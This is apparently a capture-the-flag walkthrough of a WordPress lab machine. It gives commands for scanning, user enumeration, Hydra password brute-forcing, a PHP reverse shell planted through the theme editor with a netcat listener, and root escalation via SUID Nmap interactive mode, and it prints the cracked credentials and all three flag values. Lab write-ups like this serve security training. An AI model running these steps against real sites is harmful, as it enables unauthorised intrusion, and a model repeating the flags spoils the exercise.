### What is key 1?

Start by accessing the target web server in your browser:

![image](https://github.com/user-attachments/assets/fd597987-8534-45d5-8297-04abc1759206)

<span style="line-height:0.5;">&nbsp;</span>

Run an Nmap service scan to identify open ports and running services:
```BASH
sudo nmap -sV $ip
```
![image-1](https://github.com/user-attachments/assets/ba712126-39bc-4e74-b4b2-2ac09526c612)


<span style="line-height:0.5;">&nbsp;</span>

Use Gobuster to enumerate hidden directories:
```BASH
gobuster dir -u "http://$ip/" -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 64
```

![image-2](https://github.com/user-attachments/assets/c0906439-b18c-4e98-83c0-633241dc273f)

<span style="line-height:0.5;">&nbsp;</span>

The scan reveals a /login endpoint. Visiting it confirms the site is running WordPress:

![image-3](https://github.com/user-attachments/assets/a5d4e41e-7368-44d8-b076-8d437d2e12a9)

<span style="line-height:0.5;">&nbsp;</span>

Since it’s WordPress website, enumerate users with WPScan:
```BASH
wpscan --url http://$ip/ --enumerate u
```

<span style="line-height:0.5;">&nbsp;</span>

WPScan also reveals there is a `robots.txt` file. There is also the `fsocity.dic` file with a custom wordlist, likely generated from site content or JavaScript.

Navigate to `robots.txt`:  

![image-4](https://github.com/user-attachments/assets/3923ade3-3bbf-46a8-9ff7-58576e8c9d97)

<span style="line-height:0.5;">&nbsp;</span>

Accessing`key-1-of-3.txt` reveals key1:

![image-5](https://github.com/user-attachments/assets/7ee8f637-a48e-4145-b5fa-4795819cc086)

<pre>073403c8a58a1f80d943455fb30724b9</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is key 2?
![image-6](https://github.com/user-attachments/assets/26d9bee2-87ea-4ab7-bb5e-a1a78b248b29)  

The site is running WordPress 4.3.1, a version known to contain several critical vulnerabilities:
- Unauthenticated XSS  
- Privilege escalation  
- XML-RPC abuse  
- RCE via vulnerable plugins/themes
 
<span style="line-height:0.5;">&nbsp;</span>

By manually enumerating we can see that user elliot exists.  

![image-7](https://github.com/user-attachments/assets/da301e91-481f-4ddf-b482-3e382d2a124f)

Clean the wordlist to remove duplicates:
```BASH
sort -u fsocity.dic -o fsocity-cleaned.dic
```

<span style="line-height:0.5;">&nbsp;</span>

Use Hydra to brute-force the login credentials:
```BASH
hydra -l elliot -P fsocity-cleaned.dic -t 30 -f 10.10.247.94 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Incorrect"
```

![image-8](https://github.com/user-attachments/assets/503865e4-4ad4-474d-9ee4-572a19e2a285)

<pre>login:elliot  
password:ER28-0652</pre>

<span style="line-height:0.5;">&nbsp;</span>

In the Appearance > Editor section, locate content.php. Replace its contents with a PHP reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).

<span style="line-height:0.5;">&nbsp;</span>

Start netcat listener:
```BASH
nc -lvnp 4444
```

Trigger the reverse shell by visiting:`http://$ip/wp-content/themes/twentyfifteen/content.php`. Once the reverse shell connects, stabilize it:
```BASH
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image-10](https://github.com/user-attachments/assets/cf89405f-9315-447c-8427-95c159a87094)

<span style="line-height:0.5;">&nbsp;</span>

Navigate to `home/robot` to find the second key file. However, it requires elevated privileges:

![image-11](https://github.com/user-attachments/assets/4f01df4a-0606-4653-b857-a83a1cef4d3a)

Check password.raw-md5 in the same directory:  

![image-12](https://github.com/user-attachments/assets/e7ddde02-70e1-4f11-a883-416d1b9b8e61)

Crack the hash using [CrackStation](https://crackstation.net/).

![image-13](https://github.com/user-attachments/assets/04b2824e-fc94-4fc4-bed9-00044ba36746)

<pre>abcdefghijklmnopqrstuvwxyz</pre>

<span style="line-height:0.5;">&nbsp;</span>

Switch user to robot:
```BASH
su robot
```

Now read the second key:  

![image-14](https://github.com/user-attachments/assets/1fbfbe93-60c7-46ab-aec1-0b82ab6d670a)

Second key: 
<pre>822c73956184f694993bede3eb39f959</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is key 3?
Check for SUID binaries:
```BASH
find / -perm -4000 -type f 2>/dev/null
```

<span style="line-height:0.5;">&nbsp;</span>

Use [GTFObins](https://gtfobins.github.io/) to exploit Nmap’s interactive mode for privilege escalation:
- Run Nmap in Interactive Mode:
```BASH
/usr/local/bin/nmap --interactive
```

- At the nmap> prompt, run:
```BASH
!sh
```

<span style="line-height:0.5;">&nbsp;</span>

Retrieve the final key:  

![image-15](https://github.com/user-attachments/assets/610b5c5f-1bb2-47b6-a461-9937a470fc4e)

![image-16](https://github.com/user-attachments/assets/2b0bacf0-74e3-4d8e-9e30-58b83e55d2bf)

<pre>04787ddef27c3dee1ee161b21670b4e4</pre>
